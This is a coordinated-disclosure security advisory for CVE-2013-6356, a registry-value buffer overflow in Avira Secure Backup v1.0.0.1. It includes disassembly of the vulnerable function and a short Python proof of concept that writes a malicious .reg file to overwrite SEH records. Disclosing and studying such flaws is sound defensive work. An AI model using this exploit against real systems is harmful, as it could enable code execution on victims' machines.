@@ -1,0 +1,186 @@
+RCE Security Advisory
+http://www.rcesecurity.com
+ 
+ 
+1. ADVISORY INFORMATION
+-----------------------
+Product:        Avira Secure Backup
+Vendor URL:     www.avira.com
+Type:           Improper Restriction of Operations within the Bounds of
+a Memory Buffer [CWE-119]
+Date found:     2013-10-30
+Date published: 2013-11-16
+CVSSv2 Score:   4,4 (AV:L/AC:M/Au:N/C:P/I:P/A:P)
+CVE:            CVE-2013-6356
+ 
+ 
+2. CREDITS
+----------
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+ 
+ 
+3. VERSIONS AFFECTED
+--------------------
+Avira Secure Backup v1.0.0.1 Build 3616
+ 
+ 
+4. VULNERABILITY DESCRIPTION
+----------------------------
+A buffer overflow vulnerability has been identified in Avira Secure
+Backup v1.0.0.1 Build 3616.
+ 
+The application loads the values of the Registry Keys
+"AutoUpdateDownloadFilename" and "AutoUpdateProgressFilename" from
+"HKEY_CURRENT_USER\Software\Avira Secure Backup" on startup but does not
+properly validate the length of the fetched values before using them in
+the further application context, which leads to a buffer overflow
+condition with possible persistent code execution. 
+ 
+The application queries the values via a RegQueryValueExW call and a
+fixed buffer pointer (lpData) and a fixed buffer size pointer
+(lpcbData). If the input string size is greater than the predefined
+size, the application uses a second RegQueryValueExW call with the new
+buffer size set to the length of the input string, but reuses the
+original buffer pointer (lpData), which has not been resized. This
+results in overwriting memory space inlcuding SEH - records.
+ 
+An attacker needs to force the victim to import an arbitrary .reg file
+in order to exploit the vulnerability. Successful exploits can allow
+attackers to execute arbitrary code with the privileges of the user
+running the application. Failed exploits will result in a
+denial-of-service condition. The attack scenario is persistent, because
+the code is executed as long as the manipulated values are loaded into
+the Registry. 
+ 
+ 
+5. DEBUG INFORMATION
+--------------------
+Call stack of main thread
+Address    Returns to   Procedure / arguments       Called
+from                  
+0012EB48   77DA6F87     <JMP.&ntdll.memmove>        ADVAPI32.77DA6F82
+0012EB4C   0012ECBC       dest = 0012ECBC
+0012EB50   0015760C       src = 0015760C
+0012EB54   00002712       n = 2712 (10002.)
+0012EC28   77DA708B     ADVAPI32.77DA6E02           ADVAPI32.77DA7086
+0012EC60   0043F15D     Includes ADVAPI32.77DA708B  Avira_Se.0043F15B
+0012EC9C   0043F3F8     Avira_Se.0043F0D2           Avira_Se.0043F3F3
+0012F5B4   00CC00CC     *** CORRUPT ENTRY ***
+ 
+The vulnerable code part of Avira Secure Backup.exe: 
+0043F0D2  PUSH EBP
+0043F0D3  MOV EBP,ESP
+0043F0D5  SUB ESP,10
+0043F0D8  PUSH EBX
+0043F0D9  PUSH ESI
+0043F0DA  MOV ESI,DWORD PTR DS:[<&ADVAPI32.RegOpen>; 
+ADVAPI32.RegOpenKeyExW
+0043F0E0  PUSH EDI
+0043F0E1  LEA EAX,DWORD PTR SS:[EBP-8]
+0043F0E4  PUSH EAX                                 ; /pHandle
+0043F0E5  PUSH 20019                               ; |Access
+0043F0EA  XOR EBX,EBX                              ; |
+0043F0EC  PUSH EBX                                 ; |Reserved => 0
+0043F0ED  PUSH DWORD PTR SS:[EBP+C]                ; |Subkey
+0043F0F0  MOV BYTE PTR SS:[EBP-1],BL               ; |
+0043F0F3  PUSH DWORD PTR SS:[EBP+8]                ; |hKey
+0043F0F6  MOV DWORD PTR SS:[EBP-C],820             ; |
+0043F0FD  CALL ESI                                 ; \RegOpenKeyExW
+0043F0FF  MOV EDI,DWORD PTR DS:[<&ADVAPI32.RegQuer>; 
+ADVAPI32.RegQueryValueExW
+0043F105  TEST EAX,EAX
+0043F107  JNZ SHORT Avira_Se.0043F133
+0043F109  LEA EAX,DWORD PTR SS:[EBP-C]
+0043F10C  PUSH EAX                                 ; /pBufSize
+0043F10D  PUSH DWORD PTR SS:[EBP+14]               ; |Buffer
+0043F110  LEA EAX,DWORD PTR SS:[EBP-10]            ; |
+0043F113  PUSH EAX                                 ; |pValueType
+0043F114  PUSH EBX                                 ; |Reserved => NULL
+0043F115  PUSH DWORD PTR SS:[EBP+10]               ; |ValueName
+0043F118  PUSH DWORD PTR SS:[EBP-8]                ; |hKey
+0043F11B  CALL EDI                                 ; \RegQueryValueExW
+0043F11D  TEST EAX,EAX 
+0043F11F  JNZ SHORT Avira_Se.0043F125
+0043F121  MOV BYTE PTR SS:[EBP-1],1
+0043F125  PUSH DWORD PTR SS:[EBP-8]                ; /hKey
+0043F128  CALL DWORD PTR DS:[<&ADVAPI32.RegCloseKe>; \RegCloseKey
+0043F12E  CMP BYTE PTR SS:[EBP-1],BL
+0043F131  JNZ SHORT Avira_Se.0043F16E
+0043F133  LEA EAX,DWORD PTR SS:[EBP-8]
+0043F136  PUSH EAX
+0043F137  PUSH 20119
+0043F13C  PUSH EBX
+0043F13D  PUSH DWORD PTR SS:[EBP+C]
+0043F140  PUSH DWORD PTR SS:[EBP+8]
+0043F143  CALL ESI 
+0043F145  TEST EAX,EAX
+0043F147  JNZ SHORT Avira_Se.0043F16E
+0043F149  LEA EAX,DWORD PTR SS:[EBP-C]
+0043F14C  PUSH EAX
+0043F14D  PUSH DWORD PTR SS:[EBP+14]
+0043F150  LEA EAX,DWORD PTR SS:[EBP-10]
+0043F153  PUSH EAX
+0043F154  PUSH EBX
+0043F155  PUSH DWORD PTR SS:[EBP+10]
+0043F158  PUSH DWORD PTR SS:[EBP-8]
+0043F15B  CALL EDI 
+0043F15D  TEST EAX,EAX
+0043F15F  JNZ SHORT Avira_Se.0043F165
+0043F161  MOV BYTE PTR SS:[EBP-1],1
+0043F165  PUSH DWORD PTR SS:[EBP-8]                ; /hKey
+0043F168  CALL DWORD PTR DS:[<&ADVAPI32.RegCloseKe>; \RegCloseKey
+0043F16E  XOR EAX,EAX
+0043F170  CMP BYTE PTR SS:[EBP-1],BL
+0043F173  POP EDI
+0043F174  POP ESI
+0043F175  SETNE AL
+0043F178  POP EBX
+0043F179  LEAVE
+0043F17A  RETN
+ 
+ 
+6. PROOF-OF-CONCEPT (CODE / EXPLOIT)
+------------------------------------
+Use the following code to exploit the vulnerability:
+ 
+#!/usr/bin/python
+file="poc.reg"
+ 
+junk1="\xCC" * 1240
+ 
+poc="Windows Registry Editor Version 5.00\n\n"
+poc=poc + "[HKEY_CURRENT_USER\Software\Avira Secure Backup]\n"
+poc=poc + "\"AutoUpdateProgressFilename\"=\"" + junk1 + "\""
+ 
+try:
+    print "[*] Creating exploit file...\n";
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!";
+except:
+    print "[!] Error while creating file!";
+ 
+ 
+7. SOLUTION
+-----------
+Update to v1.0.0.2 Build 3630 or later
+ 
+ 
+8. REPORT TIMELINE
+------------------
+2013-10-30: Discovery of the vulnerability
+2013-11-03: RCE Security sends first notification to vendor via mail 
+            with disclosure date set to 18. November 2013
+2013-11-03: MITRE assigns CVE-2013-6356 for this issue
+2013-11-04: Vendor ACKs the vulnerability
+2013-11-10: RCE Security asks for a status
+2013-11-11: Vendor expects to receive a fix the same day
+2013-11-13: Vendor releases v1.0.0.2 Build 3630 which fixes CVE-2013-6356
+2013-11-16: Coordinated Disclosure
+ 
+ 
+9. REFERENCES
+-------------
+http://www.rcesecurity.com/2013/11/cve-2013-6356-avira-secure-backup-v1-0-0-1-buffer-overflow-anatomy-of-a-vulnerability/
